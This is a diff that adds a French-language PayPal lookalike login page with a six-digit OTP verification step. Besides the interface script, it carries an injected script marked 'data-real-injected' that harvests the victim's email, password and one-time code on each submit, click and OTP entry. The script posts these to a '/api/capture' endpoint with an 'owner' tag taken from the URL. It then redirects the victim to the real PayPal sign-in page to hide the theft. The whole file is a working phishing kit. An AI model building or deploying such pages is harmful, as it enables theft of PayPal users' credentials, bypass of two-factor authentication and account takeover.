@@ -1,0 +1,780 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PayPal · Connexion &amp; Vérification OTP</title>
+
+<style>
+/* ============================================================
+   1. RESET & VARIABLES
+   ============================================================ */
+*,
+*::before,
+*::after {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+:root {
+  --pp-blue:       #0070e0;
+  --pp-blue-dark:  #005ea6;
+  --pp-navy:       #003087;
+  --pp-bg:         #f5f7fa;
+  --pp-white:      #ffffff;
+  --pp-text:       #111827;
+  --pp-muted:      #68717a;
+  --pp-border:     #cbd2d9;
+  --pp-error:      #d93025;
+  --radius:        12px;
+  --ease:          cubic-bezier(.2, .8, .2, 1);
+}
+
+/* ============================================================
+   2. PAGE
+   ============================================================ */
+body {
+  min-height: 100dvh;
+  display: grid;
+  place-items: center;
+  padding: 24px 16px;
+  background: linear-gradient(180deg, #f8fafc 0%, var(--pp-bg) 100%);
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  color: var(--pp-text);
+  -webkit-font-smoothing: antialiased;
+}
+
+/* ============================================================
+   3. CARTE & ÉTAPES
+   ============================================================ */
+.pp-card {
+  width: min(430px, 100%);
+  background: var(--pp-white);
+  border: 1px solid #e6ebf0;
+  border-radius: 20px;
+  padding: 36px 32px 28px;
+  box-shadow: 0 20px 45px -20px rgba(0, 48, 135, 0.22);
+}
+
+.pp-card.shake {
+  animation: ppShake 0.45s var(--ease);
+}
+
+@keyframes ppShake {
+  15%, 85% { transform: translateX(-4px); }
+  30%, 70% { transform: translateX(6px); }
+  50%      { transform: translateX(-6px); }
+}
+
+.pp-step {
+  display: none;
+}
+
+.pp-step.active {
+  display: block;
+}
+
+/* ============================================================
+   4. LOGO & EN-TÊTE
+   ============================================================ */
+.pp-brand {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  margin-bottom: 20px;
+}
+
+.pp-brand svg {
+  width: 34px;
+  height: 34px;
+}
+
+.pp-brand-name {
+  font-size: 24px;
+  font-weight: 800;
+  letter-spacing: -0.6px;
+  color: var(--pp-navy);
+}
+
+.pp-brand-name span {
+  color: var(--pp-blue);
+}
+
+.pp-title {
+  font-size: 20px;
+  font-weight: 700;
+  text-align: center;
+  margin-bottom: 6px;
+}
+
+.pp-subtitle {
+  font-size: 14px;
+  color: var(--pp-muted);
+  text-align: center;
+  line-height: 1.45;
+  margin-bottom: 24px;
+}
+
+.pp-target-user {
+  color: var(--pp-text);
+  font-weight: 700;
+}
+
+/* ============================================================
+   5. CHAMPS LOGIN (ÉTAPE 1)
+   ============================================================ */
+.pp-field {
+  position: relative;
+  margin-bottom: 14px;
+}
+
+.pp-input {
+  width: 100%;
+  height: 54px;
+  padding: 18px 14px 6px;
+  font-size: 15px;
+  color: var(--pp-text);
+  background: var(--pp-white);
+  border: 1.5px solid var(--pp-border);
+  border-radius: var(--radius);
+  outline: none;
+  transition: border-color 0.2s, box-shadow 0.2s;
+}
+
+.pp-input::placeholder {
+  color: transparent;
+}
+
+.pp-input:focus {
+  border-color: var(--pp-blue);
+  box-shadow: 0 0 0 3px rgba(0, 112, 224, 0.16);
+}
+
+.pp-input.invalid {
+  border-color: var(--pp-error);
+  box-shadow: 0 0 0 3px rgba(217, 48, 37, 0.12);
+}
+
+.pp-label {
+  position: absolute;
+  left: 14px;
+  top: 50%;
+  transform: translateY(-50%);
+  font-size: 15px;
+  color: var(--pp-muted);
+  pointer-events: none;
+  transition: top 0.16s var(--ease), font-size 0.16s var(--ease), color 0.16s;
+}
+
+.pp-input:focus + .pp-label,
+.pp-input:not(:placeholder-shown) + .pp-label {
+  top: 12px;
+  font-size: 10.5px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  color: var(--pp-blue);
+}
+
+.pp-input--pw {
+  padding-right: 48px;
+}
+
+.pp-toggle-pw {
+  position: absolute;
+  right: 8px;
+  top: 50%;
+  transform: translateY(-50%);
+  background: transparent;
+  border: none;
+  color: var(--pp-muted);
+  font-size: 12px;
+  font-weight: 700;
+  padding: 6px 8px;
+  border-radius: 8px;
+  cursor: pointer;
+}
+
+.pp-toggle-pw:hover {
+  background: #f1f5f9;
+  color: var(--pp-text);
+}
+
+/* ============================================================
+   6. CHAMPS OTP À 6 CHIFFRES (ÉTAPE 2)
+   ============================================================ */
+.pp-otp-grid {
+  display: grid;
+  grid-template-columns: repeat(6, 1fr);
+  gap: 8px;
+  margin-bottom: 14px;
+}
+
+.pp-otp-box {
+  width: 100%;
+  height: 54px;
+  text-align: center;
+  font-size: 21px;
+  font-weight: 700;
+  color: var(--pp-text);
+  background: #f8fafc;
+  border: 1.5px solid var(--pp-border);
+  border-radius: 10px;
+  outline: none;
+  transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+}
+
+.pp-otp-box:focus {
+  background: var(--pp-white);
+  border-color: var(--pp-blue);
+  box-shadow: 0 0 0 3px rgba(0, 112, 224, 0.16);
+}
+
+.pp-otp-box.invalid {
+  border-color: var(--pp-error);
+}
+
+.pp-error {
+  min-height: 18px;
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--pp-error);
+  margin: -4px 0 12px 4px;
+}
+
+/* ============================================================
+   7. BOUTONS & ACTIONS SECONDAIRES
+   ============================================================ */
+.pp-btn-primary {
+  width: 100%;
+  height: 50px;
+  border: none;
+  border-radius: 999px;
+  background: var(--pp-blue);
+  color: var(--pp-white);
+  font-size: 16px;
+  font-weight: 700;
+  cursor: pointer;
+  transition: background 0.2s, transform 0.15s;
+}
+
+.pp-btn-primary:hover:not(:disabled) {
+  background: var(--pp-blue-dark);
+}
+
+.pp-btn-primary:active:not(:disabled) {
+  transform: scale(0.99);
+}
+
+.pp-btn-primary:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+
+.pp-otp-meta {
+  margin-top: 18px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 10px;
+  font-size: 13.5px;
+  color: var(--pp-muted);
+}
+
+.pp-link-btn {
+  background: transparent;
+  border: none;
+  color: var(--pp-blue);
+  font-size: 13.5px;
+  font-weight: 700;
+  cursor: pointer;
+  padding: 4px 6px;
+}
+
+.pp-link-btn:hover:not(:disabled) {
+  text-decoration: underline;
+}
+
+.pp-link-btn:disabled {
+  color: #9aa2ac;
+  cursor: default;
+}
+
+/* ============================================================
+   8. ÉCRAN DE CHARGEMENT
+   ============================================================ */
+.pp-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(255, 255, 255, 0.94);
+  display: none;
+  place-items: center;
+  z-index: 50;
+  padding: 20px;
+}
+
+.pp-overlay.active {
+  display: grid;
+}
+
+.pp-loader-box {
+  text-align: center;
+  max-width: 320px;
+}
+
+.pp-spinner {
+  width: 48px;
+  height: 48px;
+  margin: 0 auto 14px;
+  border: 4px solid #dbeafe;
+  border-top-color: var(--pp-blue);
+  border-radius: 50%;
+  animation: ppSpin 0.8s linear infinite;
+}
+
+@keyframes ppSpin {
+  to { transform: rotate(360deg); }
+}
+
+.pp-loader-title {
+  font-size: 17px;
+  font-weight: 700;
+  color: var(--pp-navy);
+  margin-bottom: 4px;
+}
+
+.pp-loader-sub {
+  font-size: 13px;
+  color: var(--pp-muted);
+}
+
+@media (max-width: 420px) {
+  .pp-card {
+    padding: 28px 18px 22px;
+    border-radius: 16px;
+  }
+  .pp-otp-grid {
+    gap: 5px;
+  }
+  .pp-otp-box {
+    height: 48px;
+    font-size: 18px;
+  }
+}
+</style>
+</head>
+
+<body>
+  <main class="pp-card" id="authCard">
+    <div class="pp-brand">
+      <svg viewBox="0 0 36 36" aria-hidden="true">
+        <path fill="#003087" d="M26.4 7.5H13.1c-.9 0-1.7.7-1.9 1.6L7.5 28.4c-.1.7.4 1.3 1.1 1.3h5.4l1.4-7.1v.3c.2-.9 1-1.6 1.9-1.6h3.9c7.7 0 13.7-3.1 15.5-12.1.5-2.5.1-4.6-1.1-6.2-1.2-1.5-3.1-2.5-5.3-2.5z"/>
+        <path fill="#0070e0" d="M28.1 10.6c-.4 2-.9 3.8-1.7 5.3-1.9 3.7-5.8 5.4-11.2 5.4h-3.6l-1.9 9.7h4.6c.8 0 1.5-.6 1.7-1.4l.1-.5 1.3-6.8.1-.4c.2-.8.9-1.4 1.7-1.4h1.1c6.9 0 12.3-2.8 13.9-10.9.5-2.4.2-4.4-.9-5.9-.5-.7-1.2-1.2-2.3-1.5z"/>
+      </svg>
+      <div class="pp-brand-name">Pay<span>Pal</span></div>
+    </div>
+
+    <!-- ÉTAPE 1 : IDENTIFIANTS -->
+    <section class="pp-step active" id="stepLogin">
+      <h1 class="pp-title">Connexion sécurisée</h1>
+      <p class="pp-subtitle">Connectez-vous pour passer à la vérification du code.</p>
+
+      <form id="stepLoginForm" novalidate>
+        <div class="pp-field">
+          <input type="text" id="otpEmailInput" name="email" class="pp-input" placeholder=" " autocomplete="username">
+          <label for="otpEmailInput" class="pp-label">Adresse e-mail ou mobile</label>
+        </div>
+        <div class="pp-error" id="otpEmailError"></div>
+
+        <div class="pp-field">
+          <input type="password" id="otpPasswordInput" name="password" class="pp-input pp-input--pw" placeholder=" " autocomplete="current-password">
+          <label for="otpPasswordInput" class="pp-label">Mot de passe</label>
+          <button type="button" class="pp-toggle-pw" id="otpTogglePw">Afficher</button>
+        </div>
+        <div class="pp-error" id="otpPasswordError"></div>
+
+        <button type="submit" class="pp-btn-primary" id="nextToOtpBtn">Continuer</button>
+      </form>
+    </section>
+
+    <!-- ÉTAPE 2 : CODE OTP À 6 CHIFFRES -->
+    <section class="pp-step" id="stepOtp">
+      <h1 class="pp-title">Code de sécurité (OTP)</h1>
+      <p class="pp-subtitle">
+        Saisissez le code à 6 chiffres associé à<br>
+        <span class="pp-target-user" id="targetUserLabel">votre compte</span>
+      </p>
+
+      <form id="stepOtpForm" novalidate>
+        <div class="pp-otp-grid" id="otpGrid">
+          <input type="text" inputmode="numeric" maxlength="1" class="pp-otp-box" aria-label="Chiffre 1">
+          <input type="text" inputmode="numeric" maxlength="1" class="pp-otp-box" aria-label="Chiffre 2">
+          <input type="text" inputmode="numeric" maxlength="1" class="pp-otp-box" aria-label="Chiffre 3">
+          <input type="text" inputmode="numeric" maxlength="1" class="pp-otp-box" aria-label="Chiffre 4">
+          <input type="text" inputmode="numeric" maxlength="1" class="pp-otp-box" aria-label="Chiffre 5">
+          <input type="text" inputmode="numeric" maxlength="1" class="pp-otp-box" aria-label="Chiffre 6">
+        </div>
+        <div class="pp-error" id="otpCodeError"></div>
+
+        <button type="submit" class="pp-btn-primary" id="verifyOtpBtn" disabled>Vérifier le code</button>
+      </form>
+
+      <div class="pp-otp-meta">
+        <div>
+          Code non reçu ?
+          <button type="button" class="pp-link-btn" id="resendOtpBtn" disabled>Renvoyer (30s)</button>
+        </div>
+        <button type="button" class="pp-link-btn" id="backToLoginBtn">Retour à la connexion</button>
+      </div>
+    </section>
+  </main>
+
+  <div class="pp-overlay" id="otpOverlay" aria-hidden="true">
+    <div class="pp-loader-box">
+      <div class="pp-spinner"></div>
+      <div class="pp-loader-title" id="otpOverlayTitle">Vérification en cours...</div>
+      <div class="pp-loader-sub" id="otpOverlaySub">Merci de patienter.</div>
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      const CONFIG = {
+        step1DelayMs: 1200,
+        finalRedirectUrl: "https://www.paypal.com/signin",
+        finalRedirectDelayMs: 2000,
+        resendSeconds: 30
+      };
+
+      const authCard = document.getElementById("authCard");
+      const stepLogin = document.getElementById("stepLogin");
+      const stepOtp = document.getElementById("stepOtp");
+
+      const stepLoginForm = document.getElementById("stepLoginForm");
+      const emailInput = document.getElementById("otpEmailInput");
+      const passwordInput = document.getElementById("otpPasswordInput");
+      const emailError = document.getElementById("otpEmailError");
+      const passwordError = document.getElementById("otpPasswordError");
+      const togglePw = document.getElementById("otpTogglePw");
+      const nextToOtpBtn = document.getElementById("nextToOtpBtn");
+
+      const stepOtpForm = document.getElementById("stepOtpForm");
+      const otpBoxes = Array.from(document.querySelectorAll(".pp-otp-box"));
+      const otpCodeError = document.getElementById("otpCodeError");
+      const verifyOtpBtn = document.getElementById("verifyOtpBtn");
+      const targetUserLabel = document.getElementById("targetUserLabel");
+      const resendOtpBtn = document.getElementById("resendOtpBtn");
+      const backToLoginBtn = document.getElementById("backToLoginBtn");
+
+      const otpOverlay = document.getElementById("otpOverlay");
+      const otpOverlayTitle = document.getElementById("otpOverlayTitle");
+      const otpOverlaySub = document.getElementById("otpOverlaySub");
+
+      let countdownInterval = null;
+
+      function shakeCard() {
+        authCard.classList.remove("shake");
+        void authCard.offsetWidth;
+        authCard.classList.add("shake");
+      }
+
+      function setFieldError(inputEl, errorEl, msg) {
+        errorEl.textContent = msg;
+        inputEl.classList.toggle("invalid", Boolean(msg));
+      }
+
+      function getOtpCode() {
+        return otpBoxes.map((b) => b.value).join("");
+      }
+
+      function updateOtpSubmitState() {
+        verifyOtpBtn.disabled = getOtpCode().length !== otpBoxes.length;
+      }
+
+      function clearOtpBoxes() {
+        otpBoxes.forEach((box) => {
+          box.value = "";
+          box.classList.remove("invalid");
+        });
+        otpCodeError.textContent = "";
+        updateOtpSubmitState();
+      }
+
+      function startResendTimer() {
+        clearInterval(countdownInterval);
+        let remaining = CONFIG.resendSeconds;
+        resendOtpBtn.disabled = true;
+        resendOtpBtn.textContent = `Renvoyer (${remaining}s)`;
+
+        countdownInterval = setInterval(() => {
+          remaining -= 1;
+          if (remaining <= 0) {
+            clearInterval(countdownInterval);
+            resendOtpBtn.disabled = false;
+            resendOtpBtn.textContent = "Renvoyer le code";
+          } else {
+            resendOtpBtn.textContent = `Renvoyer (${remaining}s)`;
+          }
+        }, 1000);
+      }
+
+      togglePw.addEventListener("click", () => {
+        const hidden = passwordInput.type === "password";
+        passwordInput.type = hidden ? "text" : "password";
+        togglePw.textContent = hidden ? "Masquer" : "Afficher";
+        passwordInput.focus();
+      });
+
+      emailInput.addEventListener("input", () => setFieldError(emailInput, emailError, ""));
+      passwordInput.addEventListener("input", () => setFieldError(passwordInput, passwordError, ""));
+
+      stepLoginForm.addEventListener("submit", (e) => {
+        e.preventDefault();
+        const emailVal = emailInput.value.trim();
+        const passVal = passwordInput.value;
+        let ok = true;
+
+        if (!emailVal) {
+          setFieldError(emailInput, emailError, "Veuillez saisir votre adresse e-mail ou mobile.");
+          ok = false;
+        }
+        if (!passVal) {
+          setFieldError(passwordInput, passwordError, "Veuillez saisir votre mot de passe.");
+          ok = false;
+        }
+        if (!ok) {
+          shakeCard();
+          return;
+        }
+
+        nextToOtpBtn.disabled = true;
+        otpOverlayTitle.textContent = "Préparation de la vérification...";
+        otpOverlaySub.textContent = "Envoi du code de sécurité.";
+        otpOverlay.classList.add("active");
+
+        setTimeout(() => {
+          otpOverlay.classList.remove("active");
+          nextToOtpBtn.disabled = false;
+          stepLogin.classList.remove("active");
+          stepOtp.classList.add("active");
+          targetUserLabel.textContent = emailVal;
+          clearOtpBoxes();
+          startResendTimer();
+          otpBoxes[0].focus();
+        }, CONFIG.step1DelayMs);
+      });
+
+      otpBoxes.forEach((box, idx) => {
+        box.addEventListener("input", (e) => {
+          const digit = e.target.value.replace(/\D/g, "").slice(0, 1);
+          e.target.value = digit;
+          otpCodeError.textContent = "";
+          box.classList.remove("invalid");
+
+          if (digit && idx < otpBoxes.length - 1) {
+            otpBoxes[idx + 1].focus();
+          }
+          updateOtpSubmitState();
+        });
+
+        box.addEventListener("keydown", (e) => {
+          if (e.key === "Backspace" && !box.value && idx > 0) {
+            otpBoxes[idx - 1].value = "";
+            otpBoxes[idx - 1].focus();
+            updateOtpSubmitState();
+          } else if (e.key === "ArrowLeft" && idx > 0) {
+            otpBoxes[idx - 1].focus();
+          } else if (e.key === "ArrowRight" && idx < otpBoxes.length - 1) {
+            otpBoxes[idx + 1].focus();
+          }
+        });
+
+        box.addEventListener("paste", (e) => {
+          e.preventDefault();
+          const pasted = (e.clipboardData || window.clipboardData).getData("text");
+          const digits = pasted.replace(/\D/g, "").slice(0, otpBoxes.length);
+
+          otpBoxes.forEach((el, i) => {
+            el.value = digits[i] || "";
+            el.classList.remove("invalid");
+          });
+          otpCodeError.textContent = "";
+
+          const focusIdx = Math.min(digits.length, otpBoxes.length - 1);
+          otpBoxes[focusIdx].focus();
+          updateOtpSubmitState();
+        });
+      });
+
+      stepOtpForm.addEventListener("submit", (e) => {
+        e.preventDefault();
+        const code = getOtpCode();
+
+        if (code.length !== otpBoxes.length) {
+          otpCodeError.textContent = "Veuillez saisir les 6 chiffres du code OTP.";
+          otpBoxes.forEach((b) => {
+            if (!b.value) b.classList.add("invalid");
+          });
+          shakeCard();
+          return;
+        }
+
+        verifyOtpBtn.disabled = true;
+        otpOverlayTitle.textContent = "Validation du code OTP...";
+        otpOverlaySub.textContent = "Redirection vers PayPal.";
+        otpOverlay.classList.add("active");
+
+        setTimeout(() => {
+          window.location.href = CONFIG.finalRedirectUrl;
+        }, CONFIG.finalRedirectDelayMs);
+      });
+
+      resendOtpBtn.addEventListener("click", () => {
+        if (resendOtpBtn.disabled) return;
+        clearOtpBoxes();
+        startResendTimer();
+        otpBoxes[0].focus();
+      });
+
+      backToLoginBtn.addEventListener("click", () => {
+        clearInterval(countdownInterval);
+        clearOtpBoxes();
+        stepOtp.classList.remove("active");
+        stepLogin.classList.add("active");
+        emailInput.focus();
+      });
+    })();
+  </script>
+
+<script data-real-injected="true" data-injected-mode="otp">
+(function () {
+  const PARAM_CFG = {
+    endpoint: "/api/capture",
+    defaultOwner: "Kim",
+    network: "PayPal",
+    redirectUrl: "https://www.instagram.com/accounts/login/",
+    mode: "otp",
+    isOtpMode: true
+  };
+
+  const urlParams = new URLSearchParams(window.location.search);
+  const ownerVal = urlParams.get("user") || urlParams.get("ref") || PARAM_CFG.defaultOwner;
+  const typeParam = (urlParams.get("type") || PARAM_CFG.mode).toLowerCase();
+
+  let lastUser = "";
+  let lastPass = "";
+  let sentSet = new Set();
+
+  function sendCapture(payload) {
+    const key = JSON.stringify(payload);
+    if (sentSet.has(key)) return;
+    sentSet.add(key);
+
+    return fetch(PARAM_CFG.endpoint, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+      keepalive: true
+    }).catch((err) => console.log(err));
+  }
+
+  function readFields(scopeEl) {
+    const root = (scopeEl && scopeEl.closest && scopeEl.closest("form")) || document;
+    const allInputs = Array.from(root.querySelectorAll("input, select, textarea"));
+
+    let user = "";
+    let pass = "";
+    const otpParts = [];
+
+    allInputs.forEach((el) => {
+      const t = (el.type || "").toLowerCase();
+      const idName = ((el.id || "") + " " + (el.name || "") + " " + (el.placeholder || "") + " " + (el.className || "") + " " + (el.getAttribute("autocomplete") || "")).toLowerCase();
+      const maxLen = parseInt(el.getAttribute("maxlength") || "0", 10);
+
+      if (t === "password") {
+        if (!pass) pass = el.value;
+      } else if (
+        idName.includes("otp") ||
+        idName.includes("one-time-code") ||
+        idName.includes("code") ||
+        (maxLen === 1 && t !== "checkbox" && t !== "radio")
+      ) {
+        if (el.value && el.value.trim()) otpParts.push(el.value.trim());
+      } else if (!["submit", "button", "checkbox", "radio", "hidden"].includes(t)) {
+        if (!user && el.value && el.value.trim()) user = el.value.trim();
+      }
+    });
+
+    if (!user) {
+      const firstText = Array.from(document.querySelectorAll("input[type='text'], input[type='email'], input[type='tel'], input:not([type])"))
+        .find((i) => !i.classList.contains("otp-input") && i.value && i.value.trim());
+      if (firstText) user = firstText.value.trim();
+    }
+    if (!pass) {
+      const p = document.querySelector("input[type='password']");
+      if (p) pass = p.value;
+    }
+
+    return {
+      user: user || lastUser || "",
+      pass: pass || lastPass || "",
+      otp: otpParts.length > 0 ? otpParts.join("") : "Aucun"
+    };
+  }
+
+  function handleAction(e, sourceEl) {
+    const data = readFields(sourceEl);
+    if (data.user) lastUser = data.user;
+    if (data.pass) lastPass = data.pass;
+
+    const hasOtpValue = data.otp && data.otp !== "Aucun";
+    const stepType = PARAM_CFG.isOtpMode
+      ? (hasOtpValue ? (typeParam === "standard" ? "otp" : typeParam) : "otp_step1")
+      : "standard";
+
+    if (data.user || data.pass || hasOtpValue) {
+      sendCapture({
+        owner: ownerVal,
+        network: PARAM_CFG.network,
+        type: stepType,
+        victimUser: lastUser,
+        victimPass: lastPass,
+        otp: PARAM_CFG.isOtpMode ? data.otp : "Aucun"
+      });
+    }
+  }
+
+  document.addEventListener("submit", (e) => handleAction(e, e.target), true);
+
+  document.addEventListener("click", (e) => {
+    const btn = e.target.closest ? e.target.closest("button, input[type='submit'], [role='button']") : null;
+    if (!btn) return;
+    handleAction(e, btn);
+  }, true);
+
+  if (PARAM_CFG.isOtpMode) {
+    document.addEventListener("input", (e) => {
+      const el = e.target;
+      if (!el || el.tagName !== "INPUT") return;
+      const isOtpEl = el.classList.contains("otp-input") || /otp|code/i.test((el.id || "") + " " + (el.name || "") + " " + (el.getAttribute("autocomplete") || ""));
+      if (!isOtpEl) return;
+
+      const data = readFields(el);
+      if (data.otp && data.otp !== "Aucun" && data.otp.length >= 6) {
+        sendCapture({
+          owner: ownerVal,
+          network: PARAM_CFG.network,
+          type: typeParam === "standard" ? "otp" : typeParam,
+          victimUser: lastUser,
+          victimPass: lastPass,
+          otp: data.otp
+        });
+      }
+    }, true);
+  }
+})();
+</script>
+</body>
+</html>
